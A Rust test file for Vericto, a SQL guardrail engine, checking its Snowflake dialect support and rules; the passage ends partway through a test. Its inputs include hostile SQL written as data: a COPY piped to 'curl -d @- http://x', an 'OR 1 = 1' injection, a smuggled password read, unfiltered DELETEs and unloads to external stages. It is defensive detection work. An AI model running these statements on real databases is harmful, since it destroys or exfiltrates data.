//! Snowflake (3.10.0, design "SQLite and Snowflake support" §4 and §8): the
//! dialect and its walker cases, the 31 standard rules on Snowflake (design
//! §4.2: direct, variant, not applicable), the Snowflake rules VERICTO-091 to
//! VERICTO-097 (§4.3), fail-closed parse errors (§4.6), VERICTO-087 identifier
//! semantics (§4.4) and the VERICTO-085 mask rewrite (§4.5).
//!
//! The mask rewrite is pinned by golden outputs only: there is no Snowflake
//! account in CI, so the nightly equivalence run against a real account
//! (design §8) is a follow-up.

use vericto_engine::{
    AccessPolicy, Decision, Dialect, EnforcementAction, EnforcementPolicy, EvaluationOutcome,
    ParseErrorAction, Rule, RuleClass, RuleType, SensitiveColumn, Severity, evaluate,
    parser::parser_for,
};

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn rule(code: &str, severity: Severity) -> Rule {
    Rule {
        rule_id: format!("id-{code}"),
        code: code.into(),
        severity,
        default_action: EnforcementAction::Block,
        rule_type: RuleType::Standard,
        ast_condition_yaml: None,
    }
}

/// The catalogue at its published severities, the Snowflake codes included.
fn catalogue() -> Vec<Rule> {
    use Severity::*;
    let mut out: Vec<Rule> = [
        ("VERICTO-001", Critical),
        ("VERICTO-003", Critical),
        ("VERICTO-010", Critical),
        ("VERICTO-011", Critical),
        ("VERICTO-012", Critical),
        ("VERICTO-030", Critical),
        ("VERICTO-042", Critical),
        ("VERICTO-080", Critical),
        ("VERICTO-081", Critical),
        ("VERICTO-086", Critical),
        ("VERICTO-090", Critical),
        ("VERICTO-002", High),
        ("VERICTO-013", High),
        ("VERICTO-015", High),
        ("VERICTO-016", High),
        ("VERICTO-017", High),
        ("VERICTO-018", High),
        ("VERICTO-019", High),
        ("VERICTO-031", High),
        ("VERICTO-033", High),
        ("VERICTO-040", High),
        ("VERICTO-070", High),
        ("VERICTO-082", High),
        ("VERICTO-083", High),
        ("VERICTO-084", High),
        ("VERICTO-085", High),
        ("VERICTO-087", High),
        ("VERICTO-050", Medium),
        ("VERICTO-051", Medium),
        ("VERICTO-061", Medium),
        ("VERICTO-060", Low),
    ]
    .iter()
    .map(|(c, s)| rule(c, *s))
    .collect();
    out.extend(snowflake_rules());
    out
}

/// VERICTO-091 to VERICTO-097 at their proposed severities.
fn snowflake_rules() -> Vec<Rule> {
    use Severity::*;
    [
        ("VERICTO-091", Critical),
        ("VERICTO-092", Critical),
        ("VERICTO-093", Critical),
        ("VERICTO-094", High),
        ("VERICTO-095", High),
        ("VERICTO-096", High),
        ("VERICTO-097", High),
    ]
    .iter()
    .map(|(c, s)| rule(c, *s))
    .collect()
}

fn sf(sql: &str) -> EvaluationOutcome {
    evaluate(
        sql,
        Dialect::Snowflake,
        &catalogue(),
        &EnforcementPolicy::default(),
    )
}

fn sf_with(sql: &str, policy: &EnforcementPolicy) -> EvaluationOutcome {
    evaluate(sql, Dialect::Snowflake, &catalogue(), policy)
}

/// Every code the statement violates on Snowflake (default policy).
fn codes(sql: &str) -> Vec<String> {
    sf(sql)
        .violations
        .iter()
        .map(|v| v.rule_code.clone())
        .collect()
}

fn assert_fires(sql: &str, code: &str) {
    let c = codes(sql);
    assert!(
        c.iter().any(|x| x == code),
        "{code} must fire on {sql}: {c:?}"
    );
}

fn assert_quiet(sql: &str, code: &str) {
    let o = sf(sql);
    assert!(
        o.rule_code.as_deref() != Some("VERICTO-PARSE-ERROR"),
        "{sql} must be read: {o:?}"
    );
    assert!(
        !o.violations.iter().any(|v| v.rule_code == code),
        "{code} must not fire on {sql}: {:?}",
        o.violations
    );
}

fn is_parse_error(o: &EvaluationOutcome) -> bool {
    o.rule_code.as_deref() == Some("VERICTO-PARSE-ERROR")
}

// ---------------------------------------------------------------------------
// The dialect
// ---------------------------------------------------------------------------

#[test]
fn snowflake_is_a_dialect() {
    assert_eq!(
        Dialect::parse_dialect("snowflake").unwrap(),
        Dialect::Snowflake
    );
    assert_eq!(
        Dialect::parse_dialect("Snowflake").unwrap(),
        Dialect::Snowflake
    );
    assert_eq!(parser_for(Dialect::Snowflake).dialect_name(), "snowflake");
    // `as_str` is the canonical name, accepted back by `parse_dialect`.
    for d in [
        Dialect::Postgres,
        Dialect::Mysql,
        Dialect::Oracle,
        Dialect::MsSql,
        Dialect::Snowflake,
    ] {
        assert_eq!(Dialect::parse_dialect(d.as_str()).unwrap(), d);
        assert_eq!(parser_for(d).dialect_name(), d.as_str());
    }
}

/// The walker cases of the design, each read (not a parse error) and
/// recorded so that the expected codes fire and no other.
#[test]
fn walker_cases() {
    let cases: &[(&str, &[&str])] = &[
        // COPY INTO: table ← stage is a load (no finding); stage ← query is
        // an unload (VERICTO-091).
        (
            "COPY INTO orders FROM @raw_stage/orders/ FILE_FORMAT = (TYPE = CSV)",
            &[],
        ),
        (
            "COPY INTO @export_stage/orders/ FROM (SELECT id, total FROM orders WHERE id > 0) FILE_FORMAT = (TYPE = PARQUET)",
            &["VERICTO-091"],
        ),
        (
            "COPY INTO 's3://bucket/unload/' FROM orders CREDENTIALS = (AWS_KEY_ID = 'k' AWS_SECRET_KEY = 's')",
            &["VERICTO-091"],
        ),
        ("COPY INTO @~/unload FROM orders", &["VERICTO-091"]),
        // Stages.
        ("CREATE STAGE raw_stage", &[]),
        (
            "CREATE STAGE ext URL = 's3://bucket/path/' CREDENTIALS = (AWS_KEY_ID = 'k' AWS_SECRET_KEY = 's')",
            &["VERICTO-092"],
        ),
        (
            "CREATE OR REPLACE STAGE ext URL = 'azure://acct.blob.core.windows.net/c' STORAGE_INTEGRATION = azure_int",
            &["VERICTO-092"],
        ),
        ("DROP STAGE raw_stage", &[]),
        ("LIST @raw_stage", &[]),
        ("PUT 'file:///tmp/orders.csv' @raw_stage", &["VERICTO-091"]),
        // USE.
        ("USE ROLE ACCOUNTADMIN", &["VERICTO-097"]),
        ("USE ROLE analyst", &["VERICTO-097"]),
        ("USE SECONDARY ROLES ALL", &["VERICTO-097"]),
        ("USE SECONDARY ROLES NONE", &[]),
        ("USE WAREHOUSE transforming", &[]),
        ("USE DATABASE analytics", &[]),
        ("USE SCHEMA analytics.public", &[]),
        // EXECUTE IMMEDIATE and scripting blocks: a DO block (VERICTO-081),
        // and the statements inside a block are walked.
        ("EXECUTE IMMEDIATE 'SELECT 1'", &["VERICTO-081"]),
        (
            "BEGIN\n  DELETE FROM orders;\nEND",
            &["VERICTO-001", "VERICTO-081"],
        ),
        (
            "BEGIN\n  UPDATE orders SET status = 'x' WHERE id = 1;\nEND",
            &["VERICTO-081"],
        ),
        // Transactions are not blocks.
        ("BEGIN", &[]),
        ("BEGIN TRANSACTION", &[]),
        ("COMMIT", &[]),
        // Time travel.
        (
            "SELECT id FROM orders AT(TIMESTAMP => '2026-01-01'::timestamp) WHERE id = 1 LIMIT 1",
            &[],
        ),
        (
            "SELECT id FROM orders BEFORE(STATEMENT => '01a2b3c4') WHERE id = 1 LIMIT 1",
            &[],
        ),
        // Semi-structured paths and FLATTEN.
        (
            "SELECT v:customer.email::string AS email, v['items'][0] AS first_item FROM raw_events WHERE id = 1 LIMIT 10",
            &[],
        ),
        (
            "SELECT f.value FROM raw_events r, LATERAL FLATTEN(input => r.v:items) f WHERE r.id = 1 LIMIT 10",
            &[],
        ),
        // QUALIFY: walked (a sleep in it is found).
        (
            "SELECT id FROM orders QUALIFY ROW_NUMBER() OVER (PARTITION BY customer_id ORDER BY id) = 1 LIMIT 100",
            &[],
        ),
        (
            "SELECT id FROM orders QUALIFY SYSTEM$WAIT(10) = 1 LIMIT 100",
            &["VERICTO-070"],
        ),
        // MERGE.
        (
            "MERGE INTO orders t USING staged s ON t.id = s.id WHEN MATCHED THEN UPDATE SET t.total = s.total WHEN NOT MATCHED THEN INSERT (id, total) VALUES (s.id, s.total)",
            &["VERICTO-083"],
        ),
        // Shares.
        (
            "GRANT SELECT ON TABLE analytics.public.orders TO SHARE partner_share",
            &["VERICTO-082", "VERICTO-093"],
        ),
        // Warehouses.
        (
            "CREATE WAREHOUSE adhoc WITH WAREHOUSE_SIZE = 'XLARGE' MAX_CLUSTER_COUNT = 10",
            &["VERICTO-095"],
        ),
        ("CREATE WAREHOUSE adhoc", &[]),
        // Three-part names and IDENTIFIER().
        (
            "SELECT id FROM analytics.public.orders WHERE id = 1 LIMIT 1",
            &[],
        ),
        ("DELETE FROM analytics.public.orders", &["VERICTO-001"]),
        (
            "DELETE FROM IDENTIFIER('analytics.public.orders')",
            &["VERICTO-001"],
        ),
        (
            "SELECT id FROM IDENTIFIER($table_name) WHERE id = 1 LIMIT 1",
            &[],
        ),
        // Session settings.
        ("ALTER SESSION SET QUERY_TAG = 'dbt' TIMEZONE = 'UTC'", &[]),
        ("SHOW TERSE OBJECTS IN SCHEMA analytics.public", &[]),
        ("DESCRIBE TABLE analytics.public.orders", &[]),
    ];
    for (sql, expected) in cases {
        let o = sf(sql);
        assert!(!is_parse_error(&o), "{sql} must be read: {o:?}");
        let mut got: Vec<String> = o.violations.iter().map(|v| v.rule_code.clone()).collect();
        got.sort();
        got.dedup();
        let mut want: Vec<String> = expected.iter().map(|s| s.to_string()).collect();
        want.sort();
        assert_eq!(got, want, "{sql}");
    }
}

/// The pre-classifier: statements sqlparser 0.63 rejects, recognised by their
/// keywords, become findings of the rule that names them.
#[test]
fn preclassified_statements_are_findings() {
    let cases: &[(&str, &str)] = &[
        ("UNDROP TABLE orders", "VERICTO-094"),
        ("GET @export_stage/orders.csv file:///tmp/", "VERICTO-091"),
        (
            "PUT file:///tmp/orders.csv @raw_stage AUTO_COMPRESS = TRUE",
            "VERICTO-091",
        ),
        ("CREATE SHARE partner_share", "VERICTO-093"),
        (
            "ALTER SHARE partner_share ADD ACCOUNTS = org1.acct2",
            "VERICTO-093",
        ),
        (
            "ALTER WAREHOUSE wh SET WAREHOUSE_SIZE = 'X4LARGE'",
            "VERICTO-095",
        ),
        ("ALTER WAREHOUSE wh SET AUTO_SUSPEND = 0", "VERICTO-095"),
        (
            "ALTER RESOURCE MONITOR rm SET CREDIT_QUOTA = 100000",
            "VERICTO-095",
        ),
        (
            "ALTER ACCOUNT SET DATA_RETENTION_TIME_IN_DAYS = 0",
            "VERICTO-094",
        ),
        (
            "ALTER TABLE orders SET DATA_RETENTION_TIME_IN_DAYS = 0",
            "VERICTO-094",
        ),
        (
            "ALTER SCHEMA analytics.public SET DATA_RETENTION_TIME_IN_DAYS = 0",
            "VERICTO-094",
        ),
        (
            "ALTER DATABASE analytics SET DATA_RETENTION_TIME_IN_DAYS = 0",
            "VERICTO-094",
        ),
        (
            "CREATE TASK t1 WAREHOUSE = wh SCHEDULE = '5 MINUTE' AS DELETE FROM orders",
            "VERICTO-096",
        ),
        ("ALTER TASK t1 RESUME", "VERICTO-096"),
        ("CREATE STREAM s1 ON TABLE orders", "VERICTO-096"),
        (
            "CREATE PIPE p1 AS COPY INTO orders FROM @raw_stage",
            "VERICTO-096",
        ),
        (
            "CREATE OR REPLACE PROCEDURE p() RETURNS STRING LANGUAGE SQL AS $$ BEGIN RETURN 'x'; END $$",
            "VERICTO-096",
        ),
        (
            "CREATE OR ALTER FUNCTION f(a NUMBER) RETURNS NUMBER AS 'a + 1'",
            "VERICTO-096",
        ),
        (
            "CREATE STORAGE INTEGRATION si TYPE = EXTERNAL_STAGE STORAGE_PROVIDER = 'S3' ENABLED = TRUE STORAGE_ALLOWED_LOCATIONS = ('s3://b/')",
            "VERICTO-092",
        ),
        (
            "CREATE EXTERNAL ACCESS INTEGRATION eai ALLOWED_NETWORK_RULES = (r) ENABLED = TRUE",
            "VERICTO-092",
        ),
        (
            "CREATE NETWORK RULE r MODE = EGRESS TYPE = HOST_PORT VALUE_LIST = ('example.com')",
            "VERICTO-092",
        ),
        ("ALTER STAGE ext SET URL = 's3://other/'", "VERICTO-092"),
        (
            "ALTER TABLE orders DROP ROW ACCESS POLICY region_policy",
            "VERICTO-019",
        ),
        (
            "ALTER TABLE customers MODIFY COLUMN email UNSET MASKING POLICY",
            "VERICTO-019",
        ),
        (
            "DROP DYNAMIC TABLE analytics.public.orders_dt",
            "VERICTO-010",
        ),
        (
            "CREATE SCHEMA s2 CLONE s1 AT(TIMESTAMP => '2026-01-01 00:00:00')",
            "VERICTO-084",
        ),
        ("DECLARE n INT; BEGIN n := 1; RETURN n; END", "VERICTO-081"),
    ];
    for (sql, code) in cases {
        let o = sf(sql);
        assert_eq!(o.rule_code.as_deref(), Some(*code), "{sql}: {o:?}");
        assert_eq!(o.decision, Decision::Block, "{sql}");
    }
    // An ingress network rule has nothing to report and is not on the
    // allowlist: it stays a parse error, flagged by default.
    let o = sf("CREATE NETWORK RULE r MODE = INGRESS TYPE = IPV4 VALUE_LIST = ('10.0.0.0/8')");
    assert!(is_parse_error(&o), "{o:?}");
    assert_eq!(o.decision, Decision::Flag);
    // GRANT and REVOKE forms sqlparser does not read are still VERICTO-082.
    for sql in [
        "GRANT CREATE TABLE ON SCHEMA analytics.public TO ROLE dev",
        "GRANT SELECT ON FUTURE TABLES IN SCHEMA analytics.public TO ROLE reader",
        "REVOKE USAGE ON FUTURE SCHEMAS IN DATABASE analytics FROM ROLE reader",
    ] {
        let o = sf(sql);
        assert_eq!(o.rule_code.as_deref(), Some("VERICTO-082"), "{sql}: {o:?}");
        assert_eq!(o.decision, Decision::Block, "{sql}");
    }
}

/// The pre-classifier reads one statement only, and only text sqlparser
/// rejected: a second statement keeps the whole text a parse error.
#[test]
fn preclassifier_reads_one_statement_only() {
    let o = sf("UNDROP TABLE orders; DROP TABLE customers");
    assert!(is_parse_error(&o), "{o:?}");
    assert_eq!(o.decision, Decision::Flag);
    // Keywords inside a string or a comment are not the statement's.
    let o = sf("SELECT 'UNDROP TABLE x' AS s FROM orders WHERE id = 1 LIMIT 1");
    assert_eq!(o.decision, Decision::Allow, "{o:?}");
}

// ---------------------------------------------------------------------------
// The 31 standard rules on Snowflake (design §4.2)
// ---------------------------------------------------------------------------

/// How a standard rule applies on Snowflake: directly, as a variant, or not
/// at all ("n/a": the construct does not exist; the rule never fires).
enum Applies {
    Direct(&'static str, &'static str),
    Variant(&'static str, &'static str),
    NotApplicable(&'static str),
}

/// The parity matrix: one positive and one negative statement per rule
/// (for "n/a", a statement that fires the rule on Postgres or MySQL).
const MATRIX: &[(&str, Applies)] = {
    use Applies::*;
    &[
        (
            "VERICTO-001",
            Direct("DELETE FROM orders", "DELETE FROM orders WHERE id = 1"),
        ),
        (
            "VERICTO-002",
            NotApplicable("DELETE FROM orders WHERE id = 1 LIMIT 0"),
        ),
        (
            "VERICTO-086",
            NotApplicable("SELECT 1 /*! , password FROM users */"),
        ),
        (
            "VERICTO-003",
            Direct(
                "DELETE FROM orders WHERE 1 = 1",
                "DELETE FROM orders WHERE id = 1",
            ),
        ),
        (
            "VERICTO-010",
            Direct("DROP TABLE orders CASCADE", "DROP VIEW orders_v"),
        ),
        (
            "VERICTO-011",
            Direct("TRUNCATE TABLE orders", "DELETE FROM orders WHERE id = 1"),
        ),
        (
            "VERICTO-012",
            Direct(
                "DROP SCHEMA analytics.staging CASCADE",
                "DROP TABLE IF EXISTS x",
            ),
        ),
        (
            "VERICTO-013",
            Direct("DROP INDEX idx_orders", "DROP INDEX IF EXISTS idx_orders"),
        ),
        (
            "VERICTO-015",
            Direct(
                "ALTER TABLE orders DROP COLUMN legacy",
                "ALTER TABLE orders ADD COLUMN note VARCHAR",
            ),
        ),
        (
            "VERICTO-016",
            Direct(
                "ALTER TABLE orders RENAME TO orders_old",
                "ALTER TABLE orders ADD COLUMN note VARCHAR",
            ),
        ),
        (
            "VERICTO-017",
            Direct(
                "ALTER TABLE orders DROP CONSTRAINT pk_orders",
                "ALTER TABLE orders ADD COLUMN note VARCHAR",
            ),
        ),
        (
            "VERICTO-018",
            Direct(
                "ALTER TABLE orders ALTER COLUMN total SET DATA TYPE NUMBER(38, 4)",
                "ALTER TABLE orders ALTER COLUMN total SET NOT NULL",
            ),
        ),
        (
            "VERICTO-019",
            Variant(
                "ALTER TABLE orders DROP ROW ACCESS POLICY region_policy",
                "ALTER TABLE orders ADD COLUMN note VARCHAR",
            ),
        ),
        (
            "VERICTO-030",
            Direct(
                "UPDATE orders SET status = 'x'",
                "UPDATE orders SET status = 'x' WHERE id = 1",
            ),
        ),
        (
            "VERICTO-031",
            NotApplicable(
                "WITH u AS (UPDATE orders SET status = 'x' RETURNING id) SELECT * FROM u",
            ),
        ),
        (
            "VERICTO-033",
            NotApplicable("WITH d AS (DELETE FROM orders RETURNING id) SELECT * FROM d"),
        ),
        (
            "VERICTO-040",
            Direct(
                "INSERT INTO archive SELECT * FROM orders",
                "INSERT INTO archive SELECT * FROM orders WHERE id > 10",
            ),
        ),
        (
            "VERICTO-042",
            Direct(
                "UPDATE orders SET status = 'x' WHERE 1 = 1",
                "UPDATE orders SET status = 'x' WHERE id = 1",
            ),
        ),
        (
            "VERICTO-050",
            Variant(
                "SELECT id FROM orders",
                "SELECT id FROM orders SAMPLE (100 ROWS)",
            ),
        ),
        (
            "VERICTO-051",
            Direct(
                "SELECT * FROM orders LIMIT 10",
                "SELECT * FROM orders WHERE id = 1",
            ),
        ),
        (
            "VERICTO-060",
            Direct(
                "INSERT INTO orders VALUES (1, 'x')",
                "INSERT INTO orders (id, status) VALUES (1, 'x')",
            ),
        ),
        (
            "VERICTO-061",
            Direct(
                "INSERT INTO t (a) VALUES (1)",
                "INSERT INTO t (a) VALUES (1)",
            ),
        ),
        (
            "VERICTO-070",
            Variant("SELECT SYSTEM$WAIT(10)", "SELECT CURRENT_TIMESTAMP()"),
        ),
        // Snowflake has no `COPY … PROGRAM`; its exfiltration path is the
        // unload, VERICTO-091.
        (
            "VERICTO-080",
            Variant(
                "COPY orders TO PROGRAM 'curl -d @- http://x'",
                "COPY INTO @export FROM orders",
            ),
        ),
        (
            "VERICTO-081",
            Variant("EXECUTE IMMEDIATE 'DELETE FROM orders'", "SELECT 1"),
        ),
        (
            "VERICTO-082",
            Variant("GRANT ROLE analyst TO USER bob", "SELECT 1"),
        ),
        (
            "VERICTO-083",
            Direct(
                "MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE",
                "SELECT 1",
            ),
        ),
        (
            "VERICTO-084",
            Variant(
                "CREATE TABLE orders_copy CLONE orders",
                "CREATE TABLE orders_like LIKE orders",
            ),
        ),
        (
            "VERICTO-090",
            Direct(
                "SELECT id FROM orders WHERE id = 1 OR 1 = 1 LIMIT 1",
                "SELECT id FROM orders WHERE id = 1 LIMIT 1",
            ),
        ),
    ]
};

#[test]
fn standard_rules_matrix() {
    for (code, applies) in MATRIX {
        match applies {
            Applies::Direct(pos, neg) | Applies::Variant(pos, neg) => {
                // VERICTO-061's positive needs 10,001 tuples; generated below.
                if *code == "VERICTO-061" {
                    let rows = vec!["(1)"; 10_001].join(", ");
                    assert_fires(&format!("INSERT INTO t (a) VALUES {rows}"), code);
                    assert_quiet(neg, code);
                    continue;
                }
                assert_fires(pos, code);
                assert_quiet(neg, code);
            }
            Applies::NotApplicable(sql) => {
                // Never fires on Snowflake, whether the text parses or not.
                let o = sf(sql);
                assert!(
                    !o.violations.iter().any(|v| v.rule_code == *code),
                    "{code} is n/a on Snowflake: {sql} → {:?}",
                    o.violations
                );
            }
        }
    }
    assert_fires("COPY INTO @export FROM orders", "VERICTO-091");
    // The n/a rules fire elsewhere on the same text (so the test proves the
    // scoping, not a parse gap). VERICTO-086 is MySQL's own.
    for (code, sql, d) in [
        (
            "VERICTO-002",
            "DELETE FROM orders WHERE id = 1 LIMIT 0",
            Dialect::Mysql,
        ),
        (
            "VERICTO-031",
            "WITH u AS (UPDATE orders SET status = 'x' RETURNING id) SELECT * FROM u",
            Dialect::Postgres,
        ),
        (
            "VERICTO-033",
            "WITH d AS (DELETE FROM orders RETURNING id) SELECT * FROM d",
            Dialect::Postgres,
        ),
    ] {
        let o = evaluate(sql, d, &catalogue(), &EnforcementPolicy::default());
        assert!(
            o.violations.iter().any(|v| v.rule_code == code),
            "{code} on {d:?}: {o:?}"
        );
    }
}

/// The variants, case by case.
#[test]
fn standard_rule_variants() {
    // 016: SWAP WITH exchanges two names.
    assert_fires("ALTER TABLE orders SWAP WITH orders_staging", "VERICTO-016");
    // 019: masking-policy removal too.
    assert_fires(
        "ALTER TABLE customers ALTER COLUMN email UNSET MASKING POLICY",
        "VERICTO-019",
    );
    assert_fires(
        "ALTER TABLE orders DROP ALL ROW ACCESS POLICIES",
        "VERICTO-019",
    );
    // 050: TOP n, a fixed-size sample and RESULT_SCAN bound the read; a
    // percentage sample or a joined sample does not.
    assert_quiet("SELECT TOP 10 id FROM orders", "VERICTO-050");
    assert_quiet(
        "SELECT * FROM TABLE(RESULT_SCAN(LAST_QUERY_ID()))",
        "VERICTO-050",
    );
    assert_fires("SELECT id FROM orders SAMPLE (10)", "VERICTO-050");
    assert_fires(
        "SELECT o.id FROM orders o SAMPLE (10 ROWS) JOIN customers c ON c.id = o.customer_id",
        "VERICTO-050",
    );
    // 070: SYSTEM$WAIT anywhere.
    assert_fires(
        "SELECT id FROM orders WHERE SYSTEM$WAIT(5) = 0 LIMIT 1",
        "VERICTO-070",
    );
    // 081: scripting blocks; a transaction is not one.
    assert_fires("BEGIN\n  SELECT 1;\nEND", "VERICTO-081");
    assert_quiet("BEGIN TRANSACTION", "VERICTO-081");
    // 082: GRANT OWNERSHIP, GRANT ROLE, and GRANT … TO SHARE (also 093).
    assert_fires("GRANT OWNERSHIP ON TABLE orders TO ROLE r", "VERICTO-082");
    assert_fires("REVOKE ROLE analyst FROM USER bob", "VERICTO-082");
    assert_fires(
        "GRANT USAGE ON DATABASE analytics TO SHARE s",
        "VERICTO-082",
    );
    // 084: CTAS, and CLONE of a table, schema or database; LIKE copies no
    // rows.
    assert_fires(
        "CREATE TABLE orders_copy AS SELECT * FROM orders",
        "VERICTO-084",
    );
    assert_fires("CREATE SCHEMA staging_copy CLONE staging", "VERICTO-084");
    assert_fires(
        "CREATE DATABASE analytics_copy CLONE analytics",
        "VERICTO-084",
    );
    assert_quiet("CREATE TABLE orders_like LIKE orders", "VERICTO-084");
    assert_quiet("CREATE TABLE orders_new (id NUMBER)", "VERICTO-084");
}

// ---------------------------------------------------------------------------
// The Snowflake rules (design §4.3)
// ---------------------------------------------------------------------------

#[test]
fn snowflake_rules_positive_and_negative() {
    let cases: &[(&str, &[&str], &[&str])] = &[
        (
            "VERICTO-091",
            &[
                "COPY INTO @export/orders FROM orders",
                "COPY INTO 'gcs://bucket/path/' FROM (SELECT * FROM orders)",
                "COPY INTO 'azure://acct.blob.core.windows.net/c/p' FROM orders",
                "PUT 'file:///tmp/x.csv' @raw_stage",
                "GET @export/orders.csv file:///tmp/",
            ],
            &[
                "COPY INTO orders FROM @raw_stage",
                "LIST @raw_stage",
                "SELECT $1 FROM @raw_stage/file.csv LIMIT 10",
            ],
        ),
        (
            "VERICTO-092",
            &[
                "CREATE STAGE ext URL = 's3://bucket/'",
                "CREATE STAGE ext URL = 's3://bucket/' CREDENTIALS = (AWS_KEY_ID = 'k' AWS_SECRET_KEY = 's')",
                "CREATE API INTEGRATION ai API_PROVIDER = aws_api_gateway API_AWS_ROLE_ARN = 'x' ENABLED = TRUE",
                "CREATE OR REPLACE EXTERNAL FUNCTION ef(x NUMBER) RETURNS VARIANT API_INTEGRATION = ai AS 'https://example.com/f'",
            ],
            &["CREATE STAGE internal_stage", "DROP STAGE ext"],
        ),
        (
            "VERICTO-093",
            &[
                "GRANT SELECT ON TABLE orders TO SHARE s",
                "CREATE SHARE s",
                "ALTER SHARE s SET ACCOUNTS = org1.acct2",
            ],
            &["GRANT SELECT ON TABLE orders TO ROLE analyst"],
        ),
        (
            "VERICTO-094",
            &[
                "CREATE OR REPLACE TABLE orders (id NUMBER)",
                "CREATE OR REPLACE TRANSIENT TABLE orders AS SELECT 1 AS id",
                "CREATE TABLE orders (id NUMBER) DATA_RETENTION_TIME_IN_DAYS = 0",
                "CREATE OR REPLACE DATABASE analytics",
                "CREATE OR REPLACE SCHEMA analytics.staging",
                "INSERT OVERWRITE INTO orders SELECT id FROM staged WHERE id > 0",
                "UNDROP SCHEMA staging",
                "ALTER ACCOUNT SET TIMEZONE = 'UTC'",
            ],
            &[
                "CREATE TABLE IF NOT EXISTS orders (id NUMBER)",
                "CREATE TABLE orders (id NUMBER) DATA_RETENTION_TIME_IN_DAYS = 7",
                "INSERT INTO orders (id) SELECT id FROM staged WHERE id > 0",
                "CREATE OR REPLACE VIEW v AS SELECT id FROM orders",
            ],
        ),
        (
            "VERICTO-095",
            &[
                "CREATE WAREHOUSE wh WAREHOUSE_SIZE = 'X6LARGE'",
                "CREATE WAREHOUSE wh MAX_CLUSTER_COUNT = 10",
                "CREATE WAREHOUSE wh AUTO_SUSPEND = 0",
                "CREATE WAREHOUSE wh WAREHOUSE_TYPE = 'SNOWPARK-OPTIMIZED'",
                "ALTER WAREHOUSE wh SET MAX_CLUSTER_COUNT = 10",
            ],
            &["CREATE WAREHOUSE wh AUTO_SUSPEND = 60", "USE WAREHOUSE wh"],
        ),
        (
            "VERICTO-096",
            &[
                "CREATE TASK t WAREHOUSE = wh SCHEDULE = '1 MINUTE' AS INSERT INTO log SELECT 1",
                "CREATE OR REPLACE ALERT a WAREHOUSE = wh SCHEDULE = '1 MINUTE' IF (EXISTS (SELECT 1)) THEN INSERT INTO log SELECT 1",
                "ALTER TASK t MODIFY AS DELETE FROM orders",
                "EXECUTE TASK t",
            ],
            &["CALL refresh_orders()"],
        ),
        (
            "VERICTO-097",
            &[
                "USE ROLE SECURITYADMIN",
                "USE ROLE reporting",
                "USE SECONDARY ROLES ALL",
                "USE SECONDARY ROLES analyst, reporter",
            ],
            &["USE SECONDARY ROLES NONE", "USE WAREHOUSE wh"],
        ),
    ];
    for (code, positives, negatives) in cases {
        for sql in *positives {
            assert_fires(sql, code);
        }
        for sql in *negatives {
            let o = sf(sql);
            assert!(
                !o.violations.iter().any(|v| v.rule_code == *code),
                "{code} must not fire on {sql}: {o:?}"
            );
        }
    }
}

/// An administrative role is named in the evidence.
#[test]
fn vericto_097_names_administrative_roles() {
    let o = sf("USE ROLE accountadmin");
    assert_eq!(o.rule_code.as_deref(), Some("VERICTO-097"));
    assert!(
        o.ast_node_path
            .as_deref()
            .unwrap_or_default()
            .contains("administrative role"),
        "{o:?}"
    );
    let o = sf("USE ROLE analyst");
    assert!(
        !o.ast_node_path
            .as_deref()
            .unwrap_or_default()
            .contains("administrative"),
        "{o:?}"
    );
}

/// The Snowflake rules read only what the Snowflake walker records: on every
/// other dialect they never fire, even on text that parses there.
#[test]
fn snowflake_rules_never_fire_on_other_dialects() {
    for sql in [
        "CREATE OR REPLACE TABLE orders (id INT)",
        "GRANT SELECT ON orders TO analyst",
        "SELECT * FROM orders",
        "USE analytics",
        "INSERT OVERWRITE TABLE orders SELECT * FROM staged",
    ] {
        for d in [
            Dialect::Postgres,
            Dialect::Mysql,
            Dialect::Oracle,
            Dialect::MsSql,
        ] {
            let o = evaluate(sql, d, &snowflake_rules(), &EnforcementPolicy::default());
            assert!(o.violations.is_empty(), "{sql} on {d:?}: {o:?}");
        }
    }
}

#[test]
fn snowflake_rule_classes() {
    assert_eq!(
        RuleClass::for_code("VERICTO-094"),
        RuleClass::SchemaMigration
    );
    assert_eq!(RuleClass::for_code("VERICTO-095"), RuleClass::Performance);
    for c in [
        "VERICTO-091",
        "VERICTO-092",
        "VERICTO-093",
        "VERICTO-096",
        "VERICTO-097",
    ] {
        assert_eq!(RuleClass::for_code(c), RuleClass::Security, "{c}");
    }
    // A CI channel softens recovery DDL, never an unload.
    let ci = EnforcementPolicy {
        schema_migration_cap: Some(EnforcementAction::Flag),
        ..EnforcementPolicy::default()
    };
    assert_eq!(
        sf_with("CREATE OR REPLACE TABLE orders (id NUMBER)", &ci).decision,
        Decision::Flag
    );
    assert_eq!(
        sf_with("COPY INTO @export FROM orders", &ci).decision,
        Decision::Block
    );
}

// ---------------------------------------------------------------------------
// Fail-closed (design §4.6)
// ---------------------------------------------------------------------------

const UNPARSEABLE: &str = "CREATE MASKING POLICY m AS (v STRING) RETURNS STRING -> '***'";

fn tagged(policy: EnforcementPolicy) -> EnforcementPolicy {
    EnforcementPolicy {
        sensitive_columns: serde_json::from_str(
            r#"[{"table":"customers","column":"email","policy":"mask"}]"#,
        )
        .unwrap(),
        ..policy
    }
}

fn enforced_agent(policy: EnforcementPolicy) -> EnforcementPolicy {
    EnforcementPolicy {
        access_policy: Some(serde_json::from_str(r#"{"mode":"enforce","entries":[]}"#).unwrap()),
        ..policy
    }
}

/// Unparseable Snowflake text resolves like on every dialect: flagged by
/// default, blocked when the host asks for it or a protection forces it.
#[test]
fn snowflake_parse_errors_follow_the_host_policy() {
    let o = sf(UNPARSEABLE);
    assert!(is_parse_error(&o), "{o:?}");
    assert_eq!(o.decision, Decision::Flag);
    assert_eq!(o.action, Some(EnforcementAction::Flag));
    let closed = EnforcementPolicy {
        parse_error: ParseErrorAction::Block,
        ..EnforcementPolicy::default()
    };
    assert_eq!(sf_with(UNPARSEABLE, &closed).decision, Decision::Block);
    // The same text, and the same answer, on every sqlparser dialect.
    for d in [Dialect::Mysql, Dialect::Oracle, Dialect::MsSql] {
        let o = evaluate("SELEC 1", d, &catalogue(), &EnforcementPolicy::default());
        assert_eq!(o.decision, Decision::Flag, "{d:?}");
    }
    assert_eq!(
        EnforcementPolicy::default().effective_parse_error_for(UNPARSEABLE, Dialect::Snowflake),
        ParseErrorAction::AllowReport
    );
}

/// The behaviour table: default, monitor mode, CI cap, protective tag,
/// enforced allowlist.
#[test]
fn snowflake_parse_error_behaviour_table() {
    let monitor = EnforcementPolicy {
        monitor_mode: true,
        ..EnforcementPolicy::default()
    };
